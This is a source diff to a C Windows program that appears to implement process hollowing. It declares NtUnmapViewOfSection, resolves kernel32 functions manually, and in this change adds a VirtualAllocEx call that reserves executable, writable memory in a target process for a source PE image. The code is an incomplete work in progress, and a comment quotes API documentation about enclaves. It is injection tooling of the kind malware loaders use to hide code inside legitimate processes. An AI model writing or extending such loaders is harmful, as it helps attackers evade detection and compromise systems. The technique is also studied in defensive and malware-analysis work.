@@ -62,6 +62,7 @@ typedef BOOL(__stdcall* _ReadFile)(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
 typedef  NTSTATUS(WINAPI* _NtQueryInformationProcess)(HANDLE , PROCESS_INFORMATION_CLASS,PVOID,ULONG,PULONG);
 typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(HANDLE, PVOID);
 typedef HANDLE(* _GetProcessHeap)();
+typedef LPVOID(__stdcall* _VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD); 
 
 DWORD kernel32_base, ntdll_base; 
 
@@ -222,7 +223,18 @@ int wmain()
 	PIMAGE_NT_HEADERS srcNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)srcBuffer + srcDosHeader->e_lfanew); 
 	SIZE_T srcImgSize = srcNtHeaders->OptionalHeader.SizeOfImage; 
 #ifdef DEBUG	
-	printf("\n%x\n" ,srcImgSize); 
+	printf("[+] src image size 0x%x\n" ,srcImgSize); 
+#endif
+
+	/* ideally we allocate memory on targetimagebase , but I kept getting ERROR_INVALID_ADDRESS	
+	If this address is within an enclave that you have not initialized by calling InitializeEnclave, VirtualAllocEx allocates a page of zeros for the enclave at that address. The page must be previously uncommitted, and will not be measured with the EEXTEND instruction of the Intel Software Guard Extensions programming model.
+If the address in within an enclave that you initialized, then the allocation operation fails with the ERROR_INVALID_ADDRESS error.
+	*/
+	_VirtualAllocEx VirtualAll = find_function_address(kernel32_base, "VirtualAllocEx");
+	printf("targetimagebase is = %x",TargetImageBase);
+	LPVOID DstImgBase = VirtualAll(target, NULL, srcImgSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
+#ifdef DEBUG
+	printf("[+] DstImgBase = 0x%x , error = %d",DstImgBase,GetLastError() ); 
 #endif
 
 }
